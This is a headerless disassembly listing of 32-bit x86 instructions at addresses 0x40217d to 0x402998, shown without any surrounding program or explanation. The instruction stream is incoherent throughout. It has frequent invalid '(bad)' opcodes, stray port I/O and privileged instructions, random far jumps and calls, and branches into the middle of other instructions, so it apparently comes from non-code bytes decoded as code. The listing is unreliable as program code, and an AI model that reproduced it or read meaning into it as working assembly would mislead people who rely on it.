  40217d:	adc    DWORD PTR [ecx-0x46],edi
  402180:	push   es
  402181:	lock xchg ebp,eax
  402183:	popf   
  402184:	push   cs
  402185:	rcr    DWORD PTR [ebp+eax*2-0x66],1
  402189:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40218a:	lds    ebp,FWORD PTR [ebx-0x19b6573]
  402190:	les    ebx,FWORD PTR [ebx]
  402192:	xchg   DWORD PTR [ebx+0x72ba076],edx
  402198:	cmp    ch,cl
  40219a:	pop    es
  40219b:	arpl   WORD PTR [esi+edi*2-0xc],di
  40219f:	pop    ebx
  4021a0:	jge    0x402198
  4021a2:	mov    cl,0xb2
  4021a4:	mov    al,ds:0x37a63b57
  4021a9:	xlat   BYTE PTR ds:[ebx]
  4021aa:	lock out dx,al
  4021ac:	adc    BYTE PTR [eax-0x4b],dh
  4021af:	in     al,0x26
  4021b1:	das    
  4021b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4021b3:	mov    DWORD PTR [edx+0x15667b32],esp
  4021b9:	cdq    
  4021ba:	enter  0x36d2,0x29
  4021be:	(bad)  
  4021c0:	dec    ebp
  4021c1:	into   
  4021c2:	mov    al,cl
  4021c4:	cmp    edi,DWORD PTR ds:0xbafc2abc
  4021ca:	and    DWORD PTR [edi+eax*2+0x45],eax
  4021ce:	xchg   edi,eax
  4021cf:	in     eax,0x6c
  4021d1:	mov    eax,ds:0x6d1496d3
  4021d6:	add    al,0x36
  4021d8:	mov    dh,0xec
  4021da:	or     DWORD PTR [ecx+0x10],edi
  4021dd:	sbb    al,0x7a
  4021df:	rcr    BYTE PTR [edi+edx*2-0x1a],1
  4021e3:	nop
  4021e4:	fldcw  WORD PTR [ebx+0x5c432038]
  4021ea:	das    
  4021eb:	lods   eax,DWORD PTR ds:[esi]
  4021ec:	jecxz  0x4021df
  4021ee:	pop    esi
  4021ef:	push   esp
  4021f0:	mov    esi,0xf869ba84
  4021f5:	jge    0x402253
  4021f7:	das    
  4021f8:	mov    al,ds:0xbee3f7b6
  4021fd:	mov    bh,0x84
  4021ff:	push   ds
  402200:	pop    ds
  402201:	push   esp
  402202:	mov    cl,0xa9
  402204:	mov    bl,0xfc
  402206:	std    
  402207:	lods   eax,DWORD PTR ds:[esi]
  402208:	pop    ds
  402209:	xchg   esp,eax
  40220a:	add    BYTE PTR [ebp+0x45],ch
  40220d:	xlat   BYTE PTR ds:[ebx]
  40220e:	jo     0x4021ee
  402210:	mov    eax,ds:0xe1fd47e6
  402215:	mov    esp,0xb8df357d
  40221a:	test   BYTE PTR [edi+0x884f0fb],cl
  402220:	or     cl,0x47
  402223:	cmp    al,0xc4
  402225:	(bad)  
  402227:	ins    DWORD PTR es:[edi],dx
  402228:	loop   0x4021e9
  40222a:	jmp    0xed59:0xe263be49
  402231:	push   ebx
  402232:	push   ds
  402233:	in     eax,0x5a
  402235:	enter  0x95f3,0x75
  402239:	in     eax,0x3c
  40223b:	in     ax,dx
  40223d:	push   esi
  40223e:	mov    ds:0xedf645cd,al
  402243:	xchg   esp,eax
  402244:	std    
  402245:	test   BYTE PTR [ecx+ebx*1],ch
  402248:	and    eax,ebp
  40224a:	or     DWORD PTR [edx-0x17],esp
  40224d:	mov    ch,0xb7
  40224f:	pop    ecx
  402250:	lds    ebx,FWORD PTR [eax+esi*8]
  402253:	retf   
  402254:	outs   dx,DWORD PTR ds:[esi]
  402255:	adc    edi,DWORD PTR [ebx+0x5a7692a8]
  40225b:	cs inc esi
  40225d:	sar    DWORD PTR [esi],1
  40225f:	test   eax,0x51006f8
  402264:	add    esi,ebx
  402266:	push   cs
  402267:	and    al,BYTE PTR [ebx-0x60630858]
  40226d:	add    al,0x87
  40226f:	mov    eax,ds:0x5808d4cb
  402274:	adc    BYTE PTR [eax-0x151daac4],dh
  40227a:	test   al,bl
  40227c:	test   DWORD PTR [edx-0x17],esp
  40227f:	xchg   edi,eax
  402280:	daa    
  402281:	cmp    al,0x52
  402283:	jno    0x40229d
  402285:	push   ecx
  402286:	pop    edi
  402287:	xchg   esi,eax
  402288:	mov    bl,0xcc
  40228a:	test   BYTE PTR [ebp-0x59b0f061],0x56
  402291:	std    
  402292:	js     0x3de406c8
  402298:	fimul  WORD PTR [edx+0x60]
  40229b:	dec    eax
  40229c:	jmp    0xbac6:0x91467e8
  4022a3:	sub    al,0x4b
  4022a5:	(bad)  
  4022a6:	mov    edi,0x7e1a21d
  4022ab:	mul    DWORD PTR [eax+0xc]
  4022ae:	jns    0x4022d1
  4022b0:	cmc    
  4022b1:	inc    ebp
  4022b2:	xchg   ebp,eax
  4022b3:	out    0xfd,al
  4022b5:	push   ss
  4022b6:	sub    DWORD PTR [ebx-0x2bce54dd],esp
  4022bc:	mov    esi,0x76907c77
  4022c1:	sub    ecx,esp
  4022c3:	icebp  
  4022c4:	xchg   edi,eax
  4022c5:	int    0x91
  4022c7:	out    dx,eax
  4022c8:	sar    DWORD PTR [edi-0x4325d82e],0xb3
  4022cf:	inc    esi
  4022d0:	std    
  4022d1:	fistp  WORD PTR [esi-0x1a5c8a6b]
  4022d7:	jae    0x4022d8
  4022d9:	stos   DWORD PTR es:[edi],eax
  4022da:	ret    0x75b
  4022dd:	xchg   edx,eax
  4022de:	cld    
  4022df:	repz cmp DWORD PTR [ecx+0x76448fa9],esp
  4022e6:	push   esp
  4022e7:	rol    ah,cl
  4022e9:	mov    ds:0x3fe8934e,eax
  4022ee:	mov    es,esi
  4022f0:	cmp    al,0x96
  4022f2:	shl    DWORD PTR [ecx-0x5e],1
  4022f5:	lock mov ebp,0x5cad4fac
  4022fb:	mov    esi,0x47ef370f
  402300:	jnp    0x4022ec
  402302:	cmp    cl,BYTE PTR [ecx-0x74]
  402305:	icebp  
  402306:	div    DWORD PTR [edi+0x5b0b8c6e]
  40230c:	call   0x4cdd8cfe
  402311:	jl     0x402309
  402313:	jno    0x402393
  402315:	adc    eax,0x304da534
  40231a:	stos   BYTE PTR es:[edi],al
  40231b:	sbb    ah,BYTE PTR [edi]
  40231d:	fcomp  QWORD PTR [ecx+0x6f]
  402320:	idiv   BYTE PTR [edx+0x3b]
  402323:	jg     0x4022af
  402325:	in     al,dx
  402326:	std    
  402327:	(bad)  
  402328:	xchg   ebp,eax
  402329:	sbb    BYTE PTR [eax-0xa],ch
  40232c:	and    BYTE PTR [eax],bh
  40232e:	pop    ds
  40232f:	pop    ebx
  402330:	lds    edi,FWORD PTR [eax]
  402332:	fistp  QWORD PTR es:[ecx+0x39]
  402336:	ja     0x402346
  402338:	cdq    
  402339:	ret    0x9e2
  40233c:	mov    ds:0xa7e6a8b4,al
  402341:	add    DWORD PTR [edi+0x1eeebdc9],ebx
  402347:	cld    
  402348:	aas    
  402349:	inc    esp
  40234a:	dec    eax
  40234b:	jbe    0x4022f2
  40234d:	adc    edx,DWORD PTR [edi+0x660f5770]
  402353:	call   0x80969820
  402358:	sbb    edi,eax
  40235a:	shr    DWORD PTR [edx-0x5],cl
  40235d:	push   edi
  40235e:	adc    edx,ebx
  402360:	sbb    al,0x8d
  402362:	ja     0x4022e6
  402364:	adc    eax,0xee970a05
  402369:	loop   0x402358
  40236b:	sar    dh,cl
  40236d:	or     DWORD PTR [ebp-0x7f],eax
  402370:	cmp    eax,0xfc8685b4
  402375:	pop    esp
  402376:	push   ecx
  402377:	cmc    
  402378:	mov    esi,0xc9e3fd17
  40237d:	pop    ecx
  40237e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40237f:	and    ah,BYTE PTR [ecx]
  402381:	inc    esp
  402382:	outs   dx,DWORD PTR ds:[esi]
  402383:	(bad)  
  402384:	loopne 0x402382
  402386:	xor    BYTE PTR [ebx+edi*8+0x66],0xc
  40238b:	add    esp,DWORD PTR [edi]
  40238d:	in     eax,0x66
  40238f:	sti    
  402390:	lahf   
  402391:	clc    
  402392:	test   DWORD PTR [edx+0x1d5260c6],edx
  402398:	dec    esp
  402399:	inc    ecx
  40239a:	loope  0x402324
  40239c:	and    eax,0x6d19ed7
  4023a1:	mov    bl,0x1f
  4023a3:	aas    
  4023a4:	arpl   bp,cx
  4023a6:	inc    edi
  4023a7:	fist   DWORD PTR [edi]
  4023a9:	ror    DWORD PTR [ebx-0x7e64d7a5],0x3f
  4023b0:	(bad)  
  4023b1:	cmp    al,BYTE PTR ss:[edx+0x7b]
  4023b5:	inc    edx
  4023b6:	outs   dx,DWORD PTR ds:[esi]
  4023b7:	int    0x6e
  4023b9:	lahf   
  4023ba:	and    eax,0x1e2838cb
  4023bf:	std    
  4023c0:	pop    esp
  4023c1:	push   edi
  4023c2:	add    BYTE PTR [ecx],dl
  4023c4:	jns    0x402389
  4023c6:	(bad)  
  4023c7:	mov    BYTE PTR [edx],dh
  4023c9:	sub    bh,BYTE PTR [ebp-0x15]
  4023cc:	std    
  4023cd:	fst    QWORD PTR [ebx+0x7a82d82d]
  4023d4:	or     eax,0xe29fad7f
  4023d9:	out    dx,eax
  4023da:	xabort 0xd0
  4023dd:	out    0xb4,al
  4023df:	cdq    
  4023e0:	jmp    0xffc7:0xce94f80
  4023e7:	das    
  4023e8:	aaa    
  4023e9:	xor    dl,bl
  4023eb:	pop    edx
  4023ec:	mov    al,0x44
  4023ee:	ror    BYTE PTR [eax+0x55e481ef],0xd0
  4023f5:	fistp  WORD PTR ds:0x2cd45748
  4023fc:	aaa    
  4023fd:	pop    ds
  4023fe:	or     dl,BYTE PTR [eax-0x3050c6b]
  402404:	stos   BYTE PTR es:[edi],al
  402405:	mov    ecx,0x4c1fa277
  40240a:	mov    edx,0x4b41ad9c
  40240f:	popf   
  402410:	and    BYTE PTR [ebx+0x24dfcc06],bh
  402416:	pop    es
  402417:	jb     0x40246d
  402419:	jns    0x40239f
  40241b:	add    edx,ebp
  40241d:	fstp   DWORD PTR [edi+0xbe7065]
  402423:	fidiv  WORD PTR [ecx-0x10f55936]
  402429:	cmc    
  40242a:	(bad)  
  40242b:	cld    
  40242c:	push   esi
  40242d:	inc    ecx
  40242e:	push   0xffffff94
  402430:	jmp    0x8aff7a75
  402435:	cmp    al,0xcb
  402438:	adc    cl,BYTE PTR [ecx]
  40243a:	jmp    0x6a9e:0xb07c6023
  402441:	mov    ebx,0x4a30bb7e
  402446:	jbe    0x4024c0
  402448:	mov    esp,0xc2c94bdf
  40244d:	sub    dl,BYTE PTR [edi]
  40244f:	or     eax,0xb8d38a68
  402454:	sbb    esp,0x29
  402457:	iret   
  402458:	out    0xa4,al
  40245a:	mov    eax,0xf21b92cf
  40245f:	mov    ebp,0x13dd2a43
  402464:	jmp    0x781a5e0e
  402469:	sbb    eax,0x2779e1b3
  40246e:	mov    edi,0x4e21ed2e
  402473:	out    0xb0,eax
  402475:	arpl   WORD PTR [esi-0x41],sp
  402478:	loop   0x4024a1
  40247a:	push   eax
  40247b:	adc    ecx,DWORD PTR [ecx+0x6bf572e6]
  402481:	add    DWORD PTR [edx],edx
  402483:	xchg   ebx,eax
  402484:	jns    0x4024d9
  402486:	xchg   esi,eax
  402487:	in     al,0x86
  402489:	pop    ds
  40248a:	sub    al,0x95
  40248c:	int    0x14
  40248e:	and    eax,0x6ff5bc0d
  402493:	sub    edi,esp
  402495:	lea    edx,[edi]
  402497:	mov    es,WORD PTR ds:0xc6566a3e
  40249d:	hlt    
  40249e:	sar    bl,cl
  4024a0:	xchg   DWORD PTR [edi+edx*4],ecx
  4024a3:	ins    BYTE PTR es:[edi],dx
  4024a4:	sar    BYTE PTR [ebx+0x48cf286c],cl
  4024aa:	leave  
  4024ab:	sti    
  4024ac:	int    0xd2
  4024ae:	mov    esp,0xda9a81d9
  4024b3:	sbb    al,0x97
  4024b5:	dec    esp
  4024b6:	shr    DWORD PTR [eax+eax*1-0x516c06a6],1
  4024bd:	xchg   esp,eax
  4024be:	and    BYTE PTR [eax+ebp*2-0x3b],bh
  4024c2:	shl    BYTE PTR [esi-0x6f],0x93
  4024c6:	imul   edx,DWORD PTR [eax],0x500a562b
  4024cc:	ss jle 0x40249c
  4024cf:	(bad)  
  4024d0:	fsub   st(5),st
  4024d2:	xchg   ebx,eax
  4024d3:	gs xchg ebp,eax
  4024d5:	ins    BYTE PTR es:[edi],dx
  4024d6:	aad    0x56
  4024d8:	inc    ebp
  4024d9:	add    al,0x1b
  4024db:	push   esi
  4024dc:	leave  
  4024dd:	mov    al,ds:0x75b129cf
  4024e2:	fwait
  4024e3:	and    dh,BYTE PTR [ebx-0x45]
  4024e6:	lods   al,BYTE PTR ds:[esi]
  4024e7:	mov    ebp,0xf6c5ad26
  4024ec:	outs   dx,DWORD PTR ds:[esi]
  4024ed:	pop    es
  4024ee:	jge    0x40255c
  4024f0:	cmp    dl,bh
  4024f2:	xchg   esi,esi
  4024f4:	inc    esp
  4024f6:	xchg   edi,eax
  4024f7:	add    BYTE PTR [ebx+0x45],ch
  4024fa:	mov    edx,0x5a7a4e10
  4024ff:	shl    BYTE PTR [edi],cl
  402501:	mov    eax,ds:0x28d86cf1
  402506:	mov    edi,0xee186b70
  40250b:	imul   esi,DWORD PTR [esi-0x688c6a17],0x5a37b96c
  402515:	jg     0x40249a
  402517:	inc    eax
  402518:	test   al,0x5b
  40251a:	mov    eax,ds:0x3cc93297
  40251f:	or     dh,BYTE PTR [edx]
  402521:	mov    esi,0x49949f63
  402526:	push   edx
  402527:	int3   
  402528:	out    dx,eax
  402529:	mov    ah,0xe0
  40252b:	retf   
  40252c:	mov    esi,0x61474d96
  402531:	xchg   ebp,eax
  402532:	jnp    0x402531
  402534:	retf   
  402535:	out    0x74,al
  402537:	das    
  402538:	lods   eax,DWORD PTR ds:[esi]
  402539:	inc    eax
  40253a:	push   0x496ef3e9
  40253f:	jle    0x4024ec
  402541:	sbb    eax,0x1e1b64ee
  402546:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402547:	mov    esi,0xc2b0f2b9
  40254c:	fwait
  40254d:	retf   
  40254e:	ret    
  40254f:	jp     0x402577
  402551:	adc    al,0x89
  402553:	repnz out 0x4d,eax
  402556:	push   esp
  402557:	cmp    DWORD PTR [ecx+edi*2],esp
  40255a:	bsr    edx,DWORD PTR [esi+0x4e]
  40255e:	imul   ebx,DWORD PTR [esi],0x7b703a3c
  402564:	jb     0x402572
  402566:	es dec ebp
  402568:	dec    eax
  402569:	xchg   edi,eax
  40256a:	test   BYTE PTR [edi+0x5],al
  40256d:	iret   
  40256e:	add    esp,DWORD PTR [ebx]
  402570:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402571:	retf   0xf789
  402574:	mov    ss,WORD PTR [edi]
  402576:	sbb    eax,0x3b6c50c5
  40257b:	mov    ecx,0xf3af8069
  402580:	sbb    al,0x57
  402582:	pushf  
  402583:	(bad)  [ecx+ebp*1-0x9]
  402587:	and    al,0xd3
  402589:	pop    eax
  40258a:	or     esi,ecx
  40258c:	add    al,0x65
  40258e:	cmp    cl,BYTE PTR [esi+0xee90253]
  402594:	push   eax
  402595:	adc    al,0xfa
  402597:	in     al,0x96
  402599:	pusha  
  40259a:	sbb    ebx,DWORD PTR [edx+0x11]
  40259d:	adc    BYTE PTR [edx],cl
  40259f:	add    bh,BYTE PTR [esi+0x4b872e54]
  4025a5:	(bad)  
  4025a7:	sbb    ecx,DWORD PTR [ebp+0xc]
  4025aa:	mov    edx,0x1175a886
  4025af:	sub    al,0x7b
  4025b1:	xchg   ebx,eax
  4025b2:	cli    
  4025b3:	rol    DWORD PTR [eax],1
  4025b5:	pop    ds
  4025b6:	mov    WORD PTR [ebx],gs
  4025b8:	jecxz  0x4025fc
  4025ba:	add    ebp,esp
  4025bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4025bd:	mov    edx,0x19c2f515
  4025c2:	inc    ebx
  4025c3:	fidiv  WORD PTR [esi-0x66]
  4025c6:	hlt    
  4025c7:	das    
  4025c8:	out    dx,eax
  4025c9:	retf   
  4025ca:	inc    esp
  4025cb:	or     eax,0x96fdf543
  4025d0:	mov    al,ds:0xe65fcd5f
  4025d5:	jecxz  0x402608
  4025d7:	jae    0x40260d
  4025d9:	push   cs
  4025da:	call   0x79c5b8b4
  4025df:	rcl    BYTE PTR [edi-0x4],1
  4025e2:	push   ds
  4025e3:	jne    0x4025ce
  4025e5:	ret    
  4025e6:	add    edi,DWORD PTR [eax]
  4025e8:	inc    esp
  4025e9:	sbb    eax,DWORD PTR [ecx-0x4e]
  4025ec:	call   0x9970:0xcc051ebb
  4025f3:	sub    dl,BYTE PTR [edi]
  4025f5:	sahf   
  4025f6:	jo     0x4025c5
  4025f8:	xchg   DWORD PTR [eax-0x3e],edi
  4025fb:	or     BYTE PTR ds:0xb47dd94b,ah
  402601:	je     0x40267b
  402603:	mov    ds:0xa2326946,al
  402608:	nop
  402609:	or     esp,edx
  40260b:	pusha  
  40260c:	jg     0x4025cf
  40260e:	cld    
  40260f:	ret    
  402610:	shl    BYTE PTR [edi],1
  402612:	fs xchg ecx,eax
  402614:	push   ss
  402615:	mov    ds:0xa4352c74,al
  40261a:	sbb    eax,0x8080fb5f
  40261f:	bound  edi,QWORD PTR [edi+0x6f]
  402622:	and    al,0x4
  402624:	into   
  402625:	xor    dl,BYTE PTR [ecx+0x61e8f006]
  40262b:	cmc    
  40262c:	cmp    al,0xef
  40262e:	mov    esp,0x403f36de
  402633:	pop    ss
  402634:	push   eax
  402635:	mov    ch,0x67
  402637:	push   ds
  402638:	inc    edi
  402639:	pop    esp
  40263a:	aas    
  40263b:	sub    DWORD PTR [ecx-0x1ab115c8],eax
  402641:	add    ecx,esi
  402643:	ds es xchg ebp,eax
  402646:	mov    bh,0x6a
  402648:	shl    DWORD PTR [eax+0x35],0xbb
  40264c:	cmp    bh,BYTE PTR [ebx-0x22]
  40264f:	jecxz  0x40262f
  402651:	sbb    DWORD PTR [esi+ecx*2-0x1f2b6ec],ebp
  402658:	jno    0x402648
  40265a:	into   
  40265b:	rcl    BYTE PTR [ecx-0x546e8e1b],cl
  402661:	aaa    
  402662:	in     al,dx
  402663:	fistp  DWORD PTR [esi-0x362c2843]
  402669:	jmp    0x2ec71edc
  40266e:	out    0xd3,al
  402670:	inc    edx
  402671:	popa   
  402672:	mov    dl,0x2d
  402674:	out    0xe,al
  402676:	jbe    0x40260e
  402678:	retf   0x3620
  40267b:	(bad)  
  40267c:	cmp    DWORD PTR [ebp-0x41],ebx
  40267f:	jmp    0x679dfe13
  402684:	add    esp,DWORD PTR [ebp-0x2809dafd]
  40268a:	and    al,0x21
  40268c:	test   DWORD PTR [ebp-0x7db362ba],ecx
  402692:	sub    BYTE PTR [ecx+0x6a],al
  402695:	add    BYTE PTR ds:0x50d9f24d,0xa8
  40269c:	imul   ecx,DWORD PTR [edx+0x1a],0x2f
  4026a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4026a1:	leave  
  4026a2:	lods   eax,DWORD PTR ds:[esi]
  4026a3:	mov    bh,0xf2
  4026a5:	test   BYTE PTR [edi],0x9b
  4026a8:	cs sub dh,0xb8
  4026ac:	arpl   sp,cx
  4026ae:	es cmp eax,eax
  4026b1:	scas   eax,DWORD PTR es:[edi]
  4026b2:	in     al,0x37
  4026b4:	or     al,0xcd
  4026b6:	shl    BYTE PTR [esi+0x5c],cl
  4026b9:	fisub  DWORD PTR [ebx]
  4026bb:	cdq    
  4026bc:	sbb    al,0xb5
  4026be:	fwait
  4026bf:	pop    eax
  4026c0:	push   ss
  4026c1:	mov    ds:0xaf902e0a,eax
  4026c6:	jl     0x40268d
  4026c8:	sbb    BYTE PTR [ecx+0x28],ah
  4026cb:	outs   dx,BYTE PTR ds:[esi]
  4026cc:	push   0x67
  4026ce:	(bad)  
  4026cf:	cdq    
  4026d0:	mov    eax,esp
  4026d2:	pop    edx
  4026d3:	dec    edi
  4026d4:	xchg   ebp,eax
  4026d5:	shl    DWORD PTR [eax-0xb],0xa7
  4026d9:	pusha  
  4026da:	cli    
  4026db:	repnz add DWORD PTR [edx-0x33a3d21a],0x9f399f9d
  4026e6:	outs   dx,BYTE PTR ds:[esi]
  4026e7:	or     BYTE PTR [ebx-0x712d37fd],0x86
  4026ee:	pop    esi
  4026ef:	hlt    
  4026f0:	into   
  4026f1:	ja     0x402769
  4026f3:	lahf   
  4026f4:	(bad)  
  4026f5:	test   eax,0x85a1d5c6
  4026fa:	jns    0x4026c6
  4026fc:	in     al,0xa3
  4026fe:	or     BYTE PTR [edi+esi*1+0x42a099ec],0x8c
  402706:	(bad)  
  402707:	dec    ebp
  402708:	dec    ebx
  402709:	shl    ah,0x90
  40270c:	lock fcomp DWORD PTR [ebx-0x4b]
  402710:	dec    ebx
  402711:	push   ss
  402712:	lea    edi,[edi]
  402714:	fild   DWORD PTR [ebx+0x8]
  402717:	je     0x402797
  402719:	popa   
  40271a:	mov    esi,0xbbb46488
  40271f:	imul   ebp,DWORD PTR [esi+0x7f],0xffffffd0
  402723:	pop    ss
  402724:	ss mov dl,0xaa
  402727:	aas    
  402728:	jne    0x402723
  40272a:	fild   QWORD PTR [eax-0x7f]
  40272d:	icebp  
  40272e:	data16 xlat BYTE PTR ds:[ebx]
  402730:	popa   
  402731:	in     eax,0xa2
  402733:	push   ebp
  402734:	pop    cx
  402736:	jnp    0x402757
  402738:	jae    0x4026f1
  40273a:	arpl   bx,si
  40273c:	dec    ebx
  40273d:	jl     0x402741
  40273f:	(bad)  
  402740:	or     ecx,DWORD PTR [edi+0x26937a29]
  402746:	cmp    esp,ecx
  402748:	inc    edx
  402749:	(bad)  
  40274a:	jmp    0x51aa:0xe800958a
  402751:	js     0x402788
  402753:	gs ss enter 0xc90e,0x83
  402759:	icebp  
  40275a:	jnp    0x402733
  40275c:	das    
  40275d:	xchg   esp,esi
  40275f:	pushf  
  402760:	stos   BYTE PTR es:[edi],al
  402761:	or     ah,BYTE PTR [esi]
  402763:	int3   
  402764:	shl    BYTE PTR [esi-0x2c],0x5f
  402768:	xchg   DWORD PTR [edi+0x20c0fca3],ecx
  40276e:	cmp    eax,0x85417ead
  402773:	stos   DWORD PTR es:[edi],eax
  402774:	dec    eax
  402775:	xor    DWORD PTR [ecx],0x29c03e3a
  40277b:	xchg   esi,eax
  40277c:	pop    esp
  40277d:	stc    
  40277e:	sbb    BYTE PTR [esi+0x75],bl
  402781:	mov    esp,0x6400403f
  402786:	sub    bh,cl
  402788:	mov    ds:0x69ad760a,eax
  40278d:	cs (bad) 
  402790:	out    0xd4,eax
  402792:	aad    0xe1
  402794:	or     ebx,DWORD PTR [ebx]
  402796:	cld    
  402797:	push   0x961c4356
  40279c:	arpl   WORD PTR [edi-0x52],ax
  40279f:	and    eax,0x2c8383a
  4027a4:	sbb    al,0x10
  4027a6:	pop    edi
  4027a7:	mov    ebx,0xe6f2c658
  4027ac:	pop    edi
  4027ad:	xor    DWORD PTR [eax-0x56ca453e],eax
  4027b3:	repnz sbb edi,DWORD PTR [edx-0x3dcd6884]
  4027ba:	imul   ebx,ebp,0x5aee718f
  4027c0:	xor    DWORD PTR [ebp+0x32],esi
  4027c3:	lods   al,BYTE PTR ds:[esi]
  4027c4:	xor    BYTE PTR ds:0x3d0cdb41,bl
  4027ca:	(bad)  
  4027cb:	stc    
  4027cc:	lods   eax,DWORD PTR ds:[esi]
  4027cd:	(bad)  
  4027ce:	pushf  
  4027cf:	xor    cl,cl
  4027d1:	jbe    0x40278e
  4027d3:	std    
  4027d4:	or     DWORD PTR [edi-0x6548f68c],ebp
  4027da:	mov    al,ds:0x500f42b6
  4027df:	dec    ecx
  4027e0:	jp     0x40277b
  4027e2:	pop    ss
  4027e3:	mov    ebp,0x863332e
  4027e8:	xor    BYTE PTR [ecx+0x46],ch
  4027eb:	pop    ss
  4027ec:	das    
  4027ed:	stos   BYTE PTR es:[edi],al
  4027ee:	push   esi
  4027ef:	xchg   BYTE PTR [edx+0x26d6fccf],bl
  4027f5:	add    al,0xd9
  4027f7:	pop    esi
  4027f8:	loop   0x402842
  4027fa:	mov    edx,0x752f4387
  4027ff:	pop    ecx
  402800:	loop   0x402872
  402802:	xchg   ebx,eax
  402803:	xor    DWORD PTR [ebx],0xf9147b22
  402809:	mov    ebx,0x74bcbefb
  40280e:	rcl    BYTE PTR [edi+0x6a2842a3],cl
  402814:	add    DWORD PTR [esi-0x1773716b],ecx
  40281a:	lock scas al,BYTE PTR es:[edi]
  40281c:	(bad)  
  40281d:	data16 jle 0x402898
  402820:	iret   
  402821:	cmp    esp,DWORD PTR [eax+0x1c]
  402824:	mov    es,WORD PTR [ebp-0x2b]
  402827:	sub    esp,eax
  402829:	pop    ds
  40282a:	pop    edi
  40282b:	lods   al,BYTE PTR ds:[esi]
  40282c:	sbb    al,0xaa
  40282e:	lea    eax,[edx-0x4a32b3ad]
  402834:	pop    edi
  402835:	adc    al,0x54
  402837:	sub    al,0x3
  402839:	or     dh,ch
  40283b:	inc    ebx
  40283c:	mov    ebx,0xa4e46313
  402841:	mov    ebp,0x33f0cf
  402846:	pop    DWORD PTR [ecx+ebp*4+0x5b]
  40284a:	mov    al,0x6
  40284c:	cmp    DWORD PTR [eax],0xffffffca
  40284f:	sbb    dh,cl
  402851:	mov    ah,0xc5
  402853:	mov    dh,BYTE PTR [esi-0x7f]
  402856:	into   
  402857:	jno    0x4028c2
  402859:	pushf  
  40285a:	jmp    DWORD PTR [ebx-0x6d]
  40285d:	sbb    eax,0x2e375b98
  402862:	je     0x402897
  402864:	inc    eax
  402865:	xchg   edx,eax
  402866:	or     esi,esi
  402868:	out    dx,eax
  402869:	cmp    eax,0xda5adc1c
  40286e:	add    BYTE PTR [edx+0x26],bl
  402871:	mov    edi,0x2a0c028a
  402876:	loopne 0x402839
  402878:	mov    cl,0x30
  40287a:	pop    eax
  40287b:	push   ss
  40287c:	scas   eax,DWORD PTR es:[edi]
  40287d:	hlt    
  40287e:	test   DWORD PTR [ebx+0xa206afd],ebp
  402884:	hlt    
  402885:	cmp    ah,al
  402887:	sti    
  402888:	or     DWORD PTR [edx+ecx*1+0x48b1a613],eax
  40288f:	vpsubsw ymm2,ymm0,YMMWORD PTR [esp+eax*2-0x7eef632b]
  402898:	mov    bl,0xe6
  40289a:	adc    eax,0xc3214d4b
  40289f:	nop
  4028a0:	jno    0x40283a
  4028a2:	adc    bh,BYTE PTR [edx]
  4028a4:	mov    eax,ds:0x51326659
  4028a9:	xchg   BYTE PTR [eax-0x38],ah
  4028ac:	fwait
  4028ad:	xchg   esp,eax
  4028ae:	pop    ecx
  4028af:	jae    0x4028ac
  4028b1:	xor    ebx,edx
  4028b3:	and    al,0xe0
  4028b5:	jns    0x40284f
  4028b7:	lock addr16 xor dl,al
  4028bb:	mov    eax,ds:0x2bf03227
  4028c0:	mov    edx,0x84e4fcd
  4028c5:	cmp    esi,DWORD PTR [edi]
  4028c7:	and    BYTE PTR [edi],0x75
  4028ca:	mov    edi,0x8bc3d722
  4028cf:	jno    0x4028c6
  4028d1:	sbb    al,0xc0
  4028d3:	push   esp
  4028d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4028d5:	push   edi
  4028d6:	dec    esp
  4028d7:	xchg   edi,eax
  4028d8:	daa    
  4028d9:	(bad)  
  4028da:	inc    ebx
  4028db:	mov    dh,0x87
  4028dd:	mov    eax,ds:0x83d31750
  4028e2:	rcr    bh,1
  4028e4:	jmp    0x40293d
  4028e6:	lea    ecx,ds:0x13675a30
  4028ec:	inc    ecx
  4028ed:	lds    esi,FWORD PTR [esi-0x62]
  4028f0:	aas    
  4028f1:	xchg   DWORD PTR cs:[edi-0x40b9a5cd],ecx
  4028f8:	dec    esi
  4028f9:	in     al,dx
  4028fa:	jp     0x402881
  4028fc:	push   esp
  4028fd:	rol    DWORD PTR [edx],1
  4028ff:	mov    eax,0xdbac7aef
  402904:	adc    al,0xc7
  402906:	mov    WORD PTR [ebx-0x3ef003a9],ss
  40290c:	mov    WORD PTR [ecx],?
  40290e:	lea    ebx,[esi]
  402910:	fsubr  DWORD PTR [edi+esi*1+0x4c4471a2]
  402917:	retf   0xc27c
  40291a:	push   ecx
  40291b:	fsub   QWORD PTR [ebx]
  40291d:	jle    0x4028c7
  40291f:	fsub   QWORD PTR [esp+edx*1+0x41c06051]
  402926:	cs hlt 
  402928:	out    0xc,eax
  40292a:	xor    dh,dl
  40292c:	lea    esp,[esi]
  40292e:	sub    BYTE PTR [eax],al
  402930:	das    
  402931:	cmp    dl,BYTE PTR [ecx+0x18]
  402934:	test   eax,0x206493d1
  402939:	test   BYTE PTR [ebp-0x43021570],0x38
  402940:	pop    ds
  402941:	jg     0x402937
  402943:	jecxz  0x402925
  402945:	sti    
  402946:	push   esi
  402947:	jae    0x402966
  402949:	adc    eax,0x40eaf59b
  40294e:	rcr    DWORD PTR [esi-0x189fa70f],cl
  402954:	inc    ebx
  402955:	pop    ebx
  402956:	cwde   
  402957:	rcr    DWORD PTR [ecx+0x2b86e522],1
  40295d:	and    esi,ecx
  40295f:	aaa    
  402960:	sub    BYTE PTR [edi],cl
  402962:	or     eax,0x99970c1
  402967:	dec    edx
  402968:	push   0xffffff98
  40296a:	rol    ch,1
  40296c:	gs inc esp
  40296e:	pop    ebx
  40296f:	mov    edx,0x3e7f91ff
  402974:	push   eax
  402975:	daa    
  402976:	je     0x4029c7
  402978:	call   0x25f7:0x7ae51b26
  40297f:	ja     0x40290a
  402981:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402982:	mov    esp,0xeb978439
  402987:	jmp    0x7af5:0xa06c5af6
  40298e:	and    DWORD PTR [edi+ebp*2],edx
  402991:	cmc    
  402992:	dec    edi
  402993:	xchg   esi,eax
  402994:	sbb    al,0xd4
  402996:	jg     0x4029a7
  402998:	leave  
